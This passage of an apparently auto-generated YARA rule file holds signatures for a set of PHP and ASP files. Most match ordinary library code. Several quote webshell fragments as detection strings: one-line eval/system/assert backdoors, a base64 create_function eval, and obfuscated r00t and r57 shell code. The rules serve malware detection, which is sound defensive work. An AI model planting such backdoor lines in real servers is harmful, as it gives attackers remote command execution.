      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RefundRequest
{
   meta:
      description = "php22 - file RefundRequest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f58a39ef89f421d174960223f2094d7a30a93e35b57f3f0db9d206c1e4bfaa2"
   strings:
      $s1 = "* to process a refund through a payment gateway.  To ensure that" fullword ascii
      $s2 = "* it is best not to extend this class, rather write a PaymentProcessor" fullword ascii
      $s3 = "* your RefundRequest can be processed independantly of payment gateway," fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/lgpl.html  LGPL" fullword ascii
      $s5 = "* PaymentRequest is a generic object containing information necessary" fullword ascii
      $s6 = "* that will work correctly for the particular payment gateway." fullword ascii
      $s7 = "* Called by base object on construction.  override this" fullword ascii
      $s8 = "* @copyright  1997-2012 VerySimple, Inc." fullword ascii
      $s9 = "* to handle any special initialization" fullword ascii
      $s10 = "* @author     VerySimple Inc." fullword ascii
      $s11 = "* @version    2.0" fullword ascii
      $s12 = "$this->CustomerIP = $_SERVER['REMOTE_ADDR'];" fullword ascii
      $s13 = "* @package    verysimple::Payment" fullword ascii
      $s14 = "static $REFUND_TYPE_PARTIAL = 'Partial';" fullword ascii
      $s15 = "$this->RefundType = self::$REFUND_TYPE_FULL;" fullword ascii
      $s16 = "public $TransactionCurrency = \"USD\";" fullword ascii
      $s17 = "static $REFUND_TYPE_FULL = 'Full';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php_shell_create_function_remix2
{
   meta:
      description = "php22 - file php-shell-create_function-remix2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5af9834bf47ab023b0f208c4205378a7c5983cdca19838e0b0976c5ce1aea10b"
   strings:
      $s1 = "$function = create_function('$code',base64_decode('ZXZhbCgkX0dFVFsidGVzdCJdKTs='));" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}


rule request_class
{
   meta:
      description = "php22 - file request.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4f48fae5eacb4fa732d4b4d223bb499ffa9d10a3d57208f68e56a85717e5f083"
   strings:
      $x1 = "* @param string $proxy (Optional) The faux-url to use for proxy settings. Takes the following format: `proxy://user:pass@hostna" fullword ascii
      $x2 = "* Copyright 2010-2011 Amazon.com, Inc. or its affiliates. All Rights Reserved." fullword ascii
      $s3 = "* @link http://aws.amazon.com/php/ PHP Developer Center" fullword ascii
      $s4 = "* @param array $helpers (Optional) An associative array of classnames to use for request, and response functionality. Gets pass" fullword ascii
      $s5 = "*  http://aws.amazon.com/apache2.0" fullword ascii
      $s6 = "* @param string $proxy (Optional) The faux-url to use for proxy settings. Takes the following format: `proxy://user:pass@hostnam" ascii
      $s7 = "* @param string $url (Optional) The URL to request or service endpoint to query." fullword ascii
      $s8 = "* or in the \"license\" file accompanying this file. This file is distributed" fullword ascii
      $s9 = "* Licensed under the Apache License, Version 2.0 (the \"License\")." fullword ascii
      $s10 = "* You may not use this file except in compliance with the License." fullword ascii
      $s11 = "* express or implied. See the License for the specific language governing" fullword ascii
      $s12 = "* on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either" fullword ascii
      $s13 = "$this->set_useragent(CFRUNTIME_USERAGENT);" fullword ascii
      $s14 = "* @copyright See the included NOTICE.md file for more information." fullword ascii
      $s15 = "* @license See the included NOTICE.md file for more information." fullword ascii
      $s16 = "* The default class to use for HTTP Responses (defaults to <CFResponse>)." fullword ascii
      $s17 = "* The default class to use for HTTP Requests (defaults to <CFRequest>)." fullword ascii
      $s18 = "* Wraps the underlying `RequestCore` class with some AWS-specific customizations." fullword ascii
      $s19 = "* permissions and limitations under the License." fullword ascii
      $s20 = "* @return $this A reference to the current instance." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule php22_OGone
{
   meta:
      description = "php22 - file OGone.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80a0f921e2b6cc8f9cb2c76ae15c680c9185c539db3032556de6f7691810d8d9"
   strings:
      $x1 = "*  if no price is given, amount from authorized Data is used and deposit command is executed" fullword ascii
      $x2 = "* @see https://payment-services.ingenico.com/int/en/ogone/support/guides/integration%20guides/e-commerce/introduction" fullword ascii
      $x3 = "*  if price is given, recurPayment command is executed" fullword ascii
      $x4 = "* Process additional parameters, such as customer data and throw an exception if invalid parameters have been" fullword ascii
      $s5 = "$key, 'https://payment-services.ingenico.com/int/en/ogone/support/guides/integration%20guides/e-commerce/lin" fullword ascii
      $s6 = "private function processAdditionalPaymentData(array $params, array $config, array $additionalParams)" fullword ascii
      $s7 = "* Helper method to get a value from the main provider configuration based on a string." fullword ascii
      $s8 = "private static $OGONE_SERVER_URL_TEST = 'https://secure.ogone.com/ncol/test/orderstandard_utf8.asp';" fullword ascii
      $s9 = "private static $OGONE_SERVER_URL_LIVE = 'https://secure.ogone.com/ncol/prod/orderstandard_utf8.asp';" fullword ascii
      $s10 = "$params = $this->processAdditionalPaymentData($params, $config, $additionalParams);" fullword ascii
      $s11 = "* Executes payment" fullword ascii
      $s12 = "* @return string the encoded string" fullword ascii
      $s13 = "* Overwrite this method if you want to pass additional parmeters to Ogone during the @link(initPayment) method." fullword ascii
      $s14 = "* Executes credit" fullword ascii
      $s15 = "* @package Pimcore\\Bundle\\EcommerceFrameworkBundle\\PaymentManager\\Payment" fullword ascii
      $s16 = "* @param string $default if given (not empty) then the default value will be used if there is no array entry. If empty, the" fullword ascii
      $s17 = "$params = $this->getRawSHA($cleanedResponseParams, self::$_SHA_OUT_PARAMETERS, $this->getProviderOption('secret'));" fullword ascii
      $s18 = "//form name needs to be null in order to make sure the element names are correct - and not FORMNAME[ELEMENTNAME]" fullword ascii
      $s19 = "'ECOM_BILLTO_POSTAL_STREET_LINE1', 'ECOM_BILLTO_POSTAL_STREET_LINE2',  'ECOM_BILLTO_POSTAL_STREET_NUMBER'," fullword ascii
      $s20 = "'ECOM_SHIPTO_POSTAL_STREET_LINE1', 'ECOM_SHIPTO_POSTAL_STREET_LINE2',  'ECOM_SHIPTO_POSTAL_STREET_NUMBER'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule ProgressBarFixer
{
   meta:
      description = "php22 - file ProgressBarFixer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3d3a9cb4dfb0272aeea3a49f434fbd6d563dffffb0df8aab7b751f8372a16d48"
   strings:
      $s1 = "public function fix(\\SplFileInfo $file, $content)" fullword ascii
      $s2 = "['Symfony', 'Component', 'Console', 'Helper', 'ProgressHelper']," fullword ascii
      $s3 = "return 'ProgressHelper has been removed in favor of ProgressBar.';" fullword ascii
      $s4 = "namespace Symfony\\Upgrade\\Fixer;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_shell_assert_remix
{
   meta:
      description = "php22 - file php-shell-assert-remix.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d6569f8027c6fd40036e9bf1ba73a91a03bcbaef33efb692b6f4a417995163f"
   strings:
      $s1 = "$a = '_GET';" fullword ascii
      $s2 = "$a('$code=function() {'.$_REQUEST['code'].'}');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule ParamBagTest
{
   meta:
      description = "php22 - file ParamBagTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b57d6e29ad3b620aec4e09682ae454765d2775100e304041880fde5e5b243828"
   strings:
      $s1 = "public function testGetBoolean()" fullword ascii
      $s2 = "$bag = new ParamBag(['foo' => 'true', 'bar' => 'TRUE']);" fullword ascii
      $s3 = "$this->assertEquals(['bar' => 'TRUE'], $bag->only(['bar']));" fullword ascii
      $s4 = "namespace blink\\tests\\http;" fullword ascii
      $s5 = "use blink\\http\\ParamBag;" fullword ascii
      $s6 = "$this->assertTrue($bag->boolean('bar'));" fullword ascii
      $s7 = "$this->assertTrue($bag->boolean('foo'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule PropertyListExtractorInterface
{
   meta:
      description = "php22 - file PropertyListExtractorInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3b12a4f2691983439191b2db664dcfccb475a8cd87f4eb3d8f6477dd6f6b3ab9"
   strings:
      $s1 = "* Gets the list of properties available for the given class." fullword ascii
      $s2 = "vin Dunglas <dunglas@gmail.com>" fullword ascii
      $s3 = "* @author K" fullword ascii
      $s4 = "* Extracts the list of properties available for the given class." fullword ascii
      $s5 = "* @param array  $context" fullword ascii
      $s6 = "* @return string[]|null" fullword ascii
      $s7 = "public function getProperties($class, array $context = array());" fullword ascii
      $s8 = "namespace Symfony\\Component\\PropertyInfo;" fullword ascii
      $s9 = "interface PropertyListExtractorInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule portScan
{
   meta:
      description = "php22 - file portScan.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c088ad13a20c73c211ecc51fb32e6513bc9ae49f7c38e0caac29709e23d7a08"
   strings:
      $s1 = "<input type=\"text\" class=\"form-control\" id=\"portScanIP\" value=\"127.0.0.1\">" fullword ascii
      $s2 = "<input type=\"text\" class=\"form-control\" id=\"portScanPort\" value=\"21,80,135,139,445,1433,3306,3389,5631,43958\">" fullword ascii
      $s3 = "<input type=\"text\" class=\"form-control\" id=\"portScanPort\" value=\"21,80,135,139,445,1433,3306,3389,56" fullword ascii
      $s4 = "<button type=\"button\" class=\"btn btn-primary\" onclick=\"doPortScan()\" style=\"float: right;\">" fullword ascii
      $s5 = "<!-- tile header -->" fullword ascii
      $s6 = "<!-- /tile header -->" fullword ascii
      $s7 = "<div class=\"row\" id=\"portScanResult\" style=\"display: none;\">" fullword ascii
      $s8 = "<form class=\"form-horizontal\" role=\"form\" id=\"portScanResShow\">" fullword ascii
      $s9 = "* User: abcdlzy" fullword ascii
      $s10 = "<!-- tile body -->" fullword ascii
      $s11 = "<!-- /tile body -->" fullword ascii
      $s12 = "* Created by PhpStorm." fullword ascii
      $s13 = "header(\"Access-Control-Allow-Origin:*\");" fullword ascii
      $s14 = "<!-- tile -->" fullword ascii
      $s15 = "<!-- col 12 -->" fullword ascii
      $s16 = "<!-- /tile -->" fullword ascii
      $s17 = "* Date: 15/2/16" fullword ascii
      $s18 = "<!-- /col 6 -->" fullword ascii
      $s19 = "* Time: " fullword ascii
      $s20 = "<label for=\"input02\" class=\"col-sm-1 control-label\">Port</label>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule RelationParent
{
   meta:
      description = "php22 - file RelationParent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "873fcf5f8cbd33b2354b65daff24fd98c4aa4f8c13ed54fa20caa766d7116594"
   strings:
      $s1 = "private static $table_name = 'DataObjectTest_RelationParent';" fullword ascii
      $s2 = "namespace SilverStripe\\ORM\\Tests\\DataObjectTest;" fullword ascii
      $s3 = "private static $db = [" fullword ascii
      $s4 = "use SilverStripe\\Dev\\TestOnly;" fullword ascii
      $s5 = "use SilverStripe\\ORM\\DataObject;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_r00t
{
   meta:
      description = "php22 - file r00t.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a2d5430681c788f325d34851e8f21ee3300396c4cb7a2cf5d88662da553c9255"
   strings:
      $x1 = "<?php $OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000" ascii
      $s2 = "SUlJSUlJSUkxbD0nY291bnQnOyRJSUlJSUlJSUlJMUk9J2V4cGxvZGUnOyRJSUlJSUlJSUlJbEk9J3NldF90aW1lX2xpbWl0Jzs=')); ?><?php /* Coded By Web" ascii
      $s3 = "SUlJMUkxMT0nc3RycG9zJzskSUlJSUlJSUlJMTFsPSdmaWxlb3duZXInOyRJSUlJSUlJSUkxMUk9J3Bvc2l4X2dldHB3dWlkJzskSUlJSUlJSUlJMWxsPSd0cmltJzsk" ascii
      $s4 = "MWwxPSdjaGRpcic7JElJSUlJSUlsSWwxMT0nc3Vic3RyJzskSUlJSUlJSWxJbGxJPSdjdXJsX2Nsb3NlJzskSUlJSUlJSWxJbEkxPSdjdXJsX2V4ZWMnOyRJSUlJSUlJ" ascii
      $s5 = "SUlJSUlJSUlJbGwxPSdiYXNlbmFtZSc7JElJSUlJSUlJSWxsST0nc3ltbGluayc7JElJSUlJSUlJSWxJMT0nZndyaXRlJzskSUlJSUlJSUlJbElsPSdmb3Blbic7JElJ" ascii
      $s6 = "SUlJSUlJSUlJMWxJPSdmbHVzaCc7JElJSUlJSUlJSTFJbD0ncHJlZ19tYXRjaF9hbGwnOyRJSUlJSUlJSUkxSUk9J2VyZWdpJzskSUlJSUlJSUlJbDFsPSdmaWxlJzsk" ascii
      $s7 = "T08wMCgkTzAwME8wTzAwLDB4ODRmKTskT08wME8wME8wPSRPT08wMDAwTzAoJE9PTzAwMDAwTygkTzBPMDBPTzAwKCRPMDAwTzBPMDAsMHgxN2MpLCdOczR4RFlMK2Vv" ascii
      $s8 = "bD0naGVhZGVyJzskSUlJSUlJSWxsSTFJPSdjaG1vZCc7JElJSUlJSUlsbElsMT0nYmFzZTY0X2RlY29kZSc7JElJSUlJSUlsbElJbD0nZmNsb3NlJzskSUlJSUlJSWxJ" ascii
      $s9 = "RTJXUmdyWGZGekc3bXVucGJ3SFBBT1pxSUo5U2Qza1ZLTUM2QjF2YVE1Y2k4dFRqVWgvMGx5PScsJ0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamts" ascii
      $s10 = "bElsSUk9J2N1cmxfc2V0b3B0JzskSUlJSUlJSWxJSTExPSdjdXJsX2luaXQnOyRJSUlJSUlJbElJbEk9J3NwcmludGYnOyRJSUlJSUlJSTExSUk9J29yZCc7JElJSUlJ" ascii
      $s11 = "JYpbGoGmSHibio6w+Rb7So8GmjEPdX5zdaJptNtX8PCH8eQzdqIX8PM7zomPXcEm97bHLo+7usofxs3GGnTRcR3w+sbbmq8ncPmPG6Lz9pGbio+Gi7Tf9axXm67WSpim" ascii
      $s12 = "m6F7z7upuS9fYXvR77F7z77mxYFmS7Y7mjdGcDjpdSsPZcEnSqmH8f+w+PpmDkvmDWjwme5F3fW7iokpDPYRcS+F3p9757Mm7qER7szpt72Am6Mz+V5FcR3w+sbbmPMG" ascii
      $s13 = "9PCbSZQbxsI7tP8pxRsPY9Qgu7bwmaBzLj4w8RxntREftf8n9PYPGVjWzWR4dRDfuVWwSecpDRJHD0tH+VS75Y5n7HiH96xntpqf5ScmSWTw9aVGJYJWSpjzLSJPdRe7" ascii
      $s14 = "Spkz87+F9PrmLqM7JYbR7Vmzdjq7SVuGm6mGSpCF9Pz7mftpLiRAD0GfdVRwYkimzRCXipLFSP778fKGJsbRSSUzd69wGjc77P9G7GQz3sGf8azpxofA77n79Vq7cjB7" ascii
      $s15 = "c7gFSkQF3fFwSoq79fLbSRuRGRqfciU7LVgbGcvH+oufGjEmJoFFmoepLYmfDpKGiHiX8Y+zuVGb9jVzzsvHSPYz9V2WGoeG8jCG7kQgmjz77ecn7PgHGjYPYpRwYStG" ascii
      $s16 = "tkR49a6guSbAzqTzifMRGv5bL09f5Y5FmkcFis+bLap7iDMX8VTPYVnGdqof8ZvpDqsPYVnfJYqmY9jFm6gPdoBGdaIwSYc7DPLP7k57dZR4SkQ7mSofcj8ndjFwLoBG" ascii
      $s17 = "5RFAmeQRmjXb3q1zmkifSV+wxsb7iY3GmjMpinQ7dS7wzS879ftPdW5G3SIWJ7BxXVXb3P8ncXcgDvQptSXb3P8mzomPmf+73SXp803FGfTbSVuRzsbmD9MGDqsEisez" ascii
      $s18 = "5Y5zxoCP79QAxYbfipUzxogPdo6m3sbAz7tnGqsrFHVgvk9FGSoFGSoFGSCwLaormPSPY0kpmY9puo5E4foFGSoFGSoFmaCFzDVgvk9FGSoFGSoFGSCwLaCrFfoFGSoF" ascii
      $s19 = "LPobGeTFmV5FcRfbcVIWcoCndSkfLeQWufp757M7xRmWLRe7JsWXcYMGzejPNcEnSPLP7Vxb5Pxp86EXiq9w8YuALa2f+qDnJeaPYSuRm6GWinvncqmWYsVbc6xGm6Ep" ascii
      $s20 = "dSIf8aKmxokWLouPtp9WcY8pxRsPY9QguGR4SV6wLjWw9o1ncRJHcV+P+pIfc7iF39aW8RDfuVWmLftzLjFRLfxntsrPtsUp7HaH8YuRuo2X8R8nGHjPYVzgLjWb7ean" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule Predefined
{
   meta:
      description = "php22 - file Predefined.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5df599d0f9d7693ab21e0fe64a260e14989dee664fd531a895007f4dcec8f315"
   strings:
      $s1 = "* @method \\Pimcore\\Model\\Property\\Predefined\\Dao getDao()" fullword ascii
      $s2 = "* @param string $config" fullword ascii
      $s3 = "$property = \\Pimcore\\Cache\\Runtime::get($cacheKey);" fullword ascii
      $s4 = "$property->getDao()->getByKey();" fullword ascii
      $s5 = "public static function getByKey($key)" fullword ascii
      $s6 = "* @param string $inheritable" fullword ascii
      $s7 = "* @param int $creationDate" fullword ascii
      $s8 = "* @param string $ctype" fullword ascii
      $s9 = "public function getCreationDate()" fullword ascii
      $s10 = "public function getInheritable()" fullword ascii
      $s11 = "\\Pimcore\\Cache\\Runtime::set($cacheKey, $property);" fullword ascii
      $s12 = "public static function getById($id)" fullword ascii
      $s13 = "$property->getDao()->getById();" fullword ascii
      $s14 = "public function getCtype()" fullword ascii
      $s15 = "throw new \\Exception('Predefined property in registry is null');" fullword ascii
      $s16 = "* @param int $modificationDate" fullword ascii
      $s17 = "$property->setKey($key);" fullword ascii
      $s18 = "* @package    Property" fullword ascii
      $s19 = "$this->inheritable = (bool) $inheritable;" fullword ascii
      $s20 = "$this->creationDate = (int) $creationDate;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule PurgeableCacheItemPoolInterface
{
   meta:
      description = "php22 - file PurgeableCacheItemPoolInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "713818f80a84d177424bb22c6ad8af56b1394dca1e59434583f72ffca32f147a"
   strings:
      $s1 = "* Runs maintenance tasks which could take a long time. Should only be called from maintenance scripts." fullword ascii
      $s2 = "interface PurgeableCacheItemPoolInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_php02
{
   meta:
      description = "php22 - file php02.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "83d936f2174848fa4ec674a01b03fb8fd0c555640a7cbaf583a353ab4b6ecfbd"
   strings:
      $s1 = "<?phpfputs(fopen(c.php,w),<?eval($_POST[c]);?>" fullword ascii
      $s2 = "<?php system($_REQUEST['cmd']);?> " fullword ascii
      $s3 = "<?php assert($_POST[c]);?>" fullword ascii
      $s4 = "<?php eval($_POST[sb])?>" fullword ascii
      $s5 = "<?php @eval($_POST[c])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule recommended_plugins
{
   meta:
      description = "php22 - file recommended-plugins.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7069d042eb0b8ade7c919326abc67dfbf43475d131e03d783a652ae6473bb7a"
   strings:
      $s1 = "<div class=\"feature-section recommended-plugins three-col demo-import-boxed\" id=\"plugin-filter\">" fullword ascii
      $s2 = "class=\"separator\">|</span> <?php echo wp_kses_post( $info->author ) ?>" fullword ascii
      $s3 = "* Recommended Plugins" fullword ascii
      $s4 = "<?php foreach ( $sparkling_recommended_plugins as $plugin => $prop ) { ?>" fullword ascii
      $s5 = "global $sparkling_required_actions, $sparkling_recommended_plugins;" fullword ascii
      $s6 = "<span class=\"version\"><?php echo __( 'Version:', 'sparkling' ); ?><?php echo $info->version ?></span>" fullword ascii
      $s7 = "class=\"action_bar <?php echo ( 'install' !== $active['needs'] && $active['status'] ) ? 'active' : '' ?>\">" fullword ascii
      $s8 = "<img src=\"<?php echo esc_attr( $icon ) ?>\" alt=\"plugin box image\">" fullword ascii
      $s9 = "href=\"<?php echo esc_url( $url ) ?>\"> <?php echo $label ?> </a>" fullword ascii
      $s10 = "<a data-slug=\"<?php echo esc_attr( $plugin ) ?>\" class=\"<?php echo $class; ?>\"" fullword ascii
      $s11 = "$active = $this->check_active( $plugin );" fullword ascii
      $s12 = "$label = __( 'Deactivate', 'sparkling' );" fullword ascii
      $s13 = "$label = __( 'Activate', 'sparkling' );" fullword ascii
      $s14 = "$label = __( 'Install', 'sparkling' );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule resolve_actionfields
{
   meta:
      description = "php22 - file resolve.actionfields.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "313f5cddf24362036d9ffac1f33eff2775356f65a9562e6eb6001513e51e9eeb"
   strings:
      $s1 = "$xml = @file_get_contents($xmlFile);" fullword ascii
      $s2 = "* @var xPDOTransport $transport" fullword ascii
      $s3 = "* Handles resolving of modActionField objects" fullword ascii
      $s4 = "$tabObj = $modx->getObject('modActionField',array(" fullword ascii
      $s5 = "$actionFields = $modx->getCollection('modActionField');" fullword ascii
      $s6 = "$fieldObj = $modx->getObject('modActionField',array(" fullword ascii
      $s7 = "$xmlFile = MODX_CORE_PATH.'model/schema/modx.action.fields.schema.xml';" fullword ascii
      $s8 = "if ($tabName != 'modx-resource-content') {" fullword ascii
      $s9 = "* @var modX $modx" fullword ascii
      $s10 = "if (empty($modx)) $modx =& $transport->xpdo;" fullword ascii
      $s11 = "'other' => !empty($tab['other']) ? (string)$tab['other'] : ''," fullword ascii
      $s12 = "$tabObj = $modx->newObject('modActionField');" fullword ascii
      $s13 = "$fieldObj = $modx->newObject('modActionField');" fullword ascii
      $s14 = "if (!file_exists($xmlFile)) return false;" fullword ascii
      $s15 = "'action' => (string)$action['controller']," fullword ascii
      $s16 = "foreach ($actionFields as $actionField) {" fullword ascii
      $s17 = "foreach ($xml->action as $action) {" fullword ascii
      $s18 = "foreach ($tab->field as $field) {" fullword ascii
      $s19 = "'form' => (string)$action['form']," fullword ascii
      $s20 = "$tabName = (string)$tab['name'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule php22_r57__6_
{
   meta:
      description = "php22 - file r57 (6).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "26508bd841e3205ef105446a7930396e04db9d6b0d1e7db96fa36b2fd9e703dd"
   strings:
      $s1 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s2 = "alNxaHgyZXNlWUs0RUQ4NzJPR1ZvWkZXeld4RU5hZDdZSmdJQXNESldpRnhFRDQ5UExEc0o5SWdWOTY" fullword ascii
      $s3 = "UGJaTWN5TDAzNGRyYStmbDFWdllKWEJWcmJrajVScEU0U1hwSENVeU8weEQraVZVN0hqejlGMnlZaXI" fullword ascii
      $s4 = "bjJtbGN6Rmg4WWN4Q3F4VHBod0RiVUJ1ck1RTTJKZGIwLzBtY2crMm9BdmFac3JKS0loWmt5SFp0cTR" fullword ascii
      $s5 = "bEJxTkpYRHlEdyttK0hlb3F6YUpPL2tocFkzQ1JNRUJKQnc2VDA4WnRoN1BlOGFEYU1lVDNwMkFrbFA" fullword ascii
      $s6 = "b1BUSFUwakFzd1oyOXF3U21SUzMyVW1zV09maXo1amY3NFh5RHRZKzZJU3IrczhNOUZ2RXE2VVREUXp" fullword ascii
      $s7 = "V05BVld1ZnppdllqQjFSdnA4enN1L1J0VENPZTkzZFhKS0dibi9aazlkeGVYTXlxTkNGWkYrWng3Wjd" fullword ascii
      $s8 = "NGhDdzFoc09ZbGVmSGxJODRxZE1nQXNGeTJaYzhTd1czdnhraDZjWENJMVZ6SWwxRHdqQnVFYzEzZ0l" fullword ascii
      $s9 = "T3QwMjZldllGTCtyK2R5amhOaTNwMzQ4RDRJVU52QmxyWDJaM0ZqK0RrUCtObUlGeC83WUlVSGZhNnF" fullword ascii
      $s10 = "aHVZUm1RTmQ5UFI3bXBGZnBRd0VsRzZzNU9FWTNGeU1xNFd2bWdDdll1aHhxWDlpNzI1MEtpSW1GNXV" fullword ascii
      $s11 = "bENweWVpOStjRUZZUk5DRW53bEVmOG43NTkzemdJc29IZ05pb2s4K0JOQU1zZlJqQ3VlZDhjdWMwb0J" fullword ascii
      $s12 = "MUs2L3ZYaDlaSFB2a0x3WDJ5MTVCVklNZEllOGM1a1RnaWk5L09kQUMxcW1sd1RmaHRRckhOZjgwYlF" fullword ascii
      $s13 = "THhka1A4Vm5sR29rQlBHOSt3NkprSUhWOGFJbFJyczlNM08weHhqalQwdG9EOVRrTVk0M1BhaGJMME1" fullword ascii
      $s14 = "T09Ub2ZwOE9LUU9oeHdwQy9Pb2ZkdnF1OFUybFZVQkhQYWl2VW0rT0dEdllpd1BoMHdLbVVPVmE3S2l" fullword ascii
      $s15 = "THRDaTNVaDlLTGthVVRFYm85K0NiVXRIY1BUOS9YaXd0QUxZdHFQemV3VENZOEZ0Zjhtem16amVIT2N" fullword ascii
      $s16 = "aDBEcGxCcE5pWlp5ZVpaWjI4UVU0L1E1MnFCdEgvMUh4SmtxazNlbEFmd01XclVId3ZCU3VEaVlLOGt" fullword ascii
      $s17 = "bVZETjNRT2ljVGQyTnpKM1BwVndoNFpQWHQwcjBiUnI3Q1JwSWxseWdSWHVkVHVEQWVBMklLOGVZems" fullword ascii
      $s18 = "T3RTZ091U3dGR0RSUGdmTGdPekNNWU1GeTZ1SHZNWjZYSFRBTzlkTWdta0Y3cS9RdUpzbkNBN3dVUk9" fullword ascii
      $s19 = "WGRXNG85SHM3T2VlalVVOEgvNnloT0pxNFBHdW5UeHl3Zk5ZR25IVjczcWZXR0FLOGFCYnVOeG5lUU1" fullword ascii
      $s20 = "ckNCTlZjbVV3Ry9yekJYbTd6cHFwTkpGeTNTTmt0SWVhZVZVc29zbVA4dDlBM1VOckdXVCt2MEZqQXh" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2000KB and
      8 of them
}


rule Rem_Exp_asp
{
   meta:
      description = "php22 - file Rem_Exp.asp.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "823f4f79f62641195d1ae1fa84655eb5db448ecf83ee67038340d1855c816d79"
   strings:
      $s1 = "SourceNumber = SourceNumber - (llTemp * (MaxValuePerIndex ^ giCount))" fullword ascii
      $s2 = "FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFile\"), \"d:\\\"" fullword ascii
      $s3 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal MinUpperBound, ByVal IndexSeperator)" fullword ascii
      $s4 = "Do While Int(SourceNumber / (MaxValuePerIndex ^ MinUpperBound)) > (MaxValuePerIndex - 1)" fullword ascii
      $s5 = "iables(\"script_name\")%>?CopyFile=<%=File.Name%>&FolderPath=<%=Server.URLPathEncode(FolderPath & \"\\\")%>\">Copy</a>)</td>" fullword ascii
      $s6 = "FSO.CopyFolder Request.QueryString(\"CopyFolder\") & \"*\", \"d:\\\"" fullword ascii
      $s7 = "Response.Write Drive.DriveLetter & \" - \"" fullword ascii
      $s8 = "If Not FileSystem.FileExists(ScriptFolder & \"ext_\" & lsExt & \".gif\") Then" fullword ascii
      $s9 = "llTemp = Int(SourceNumber / (MaxValuePerIndex ^ giCount))" fullword ascii
      $s10 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword ascii
      $s11 = "<table cellpadding=\"1\" cellspacing=\"1\" border=\"0\" width=\"100%\" align=\"center\" style=\"border:1px inset\">" fullword ascii
      $s12 = "Set Folder = FileSystem.GetFolder(FolderPath)" fullword ascii
      $s13 = "ScriptFolder = ParseFolder(Request.ServerVariables(\"PATH_TRANSLATED\")) & \"images\\\"" fullword ascii
      $s14 = "<input class=\"Address\" type=\"text\" name=\"FolderPath\" value=\"<%=FolderPath%>\" style=\"width:100%\" size=\"20\">" fullword ascii
      $s15 = "If lvAttributes(2) = 1 Then lsResult = lsResult & \"System&nbsp;&nbsp;\"" fullword ascii
      $s16 = "<td bgcolor=\"<%=BgColor%>\"><%=SubFolder.DateLastModified%> </td>" fullword ascii
      $s17 = "Set FileSystem = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s18 = "Response.Write Drive.ShareName & \" [share]\"" fullword ascii
      $s19 = "lsResult = lsResult & CStr(llTemp)" fullword ascii
      $s20 = "lvAttributes = Split(ConvertBinary(AttributeValue, 1, 7, \",\"), \",\")" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule QueueUnbindOkFrame
{
   meta:
      description = "php22 - file QueueUnbindOkFrame.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05a571693feb412e0de9e6f840331232b1e83e9a3f4493b5507ee8d992911da2"
   strings:
      $s1 = "* @package PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\v091\\Protocol\\Queue" fullword ascii
      $s2 = "* @author Aleksey I. Kuleshov YOU GLOBAL LIMITED" fullword ascii
      $s3 = "use PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\v091\\Protocol\\IncomingFrame;" fullword ascii
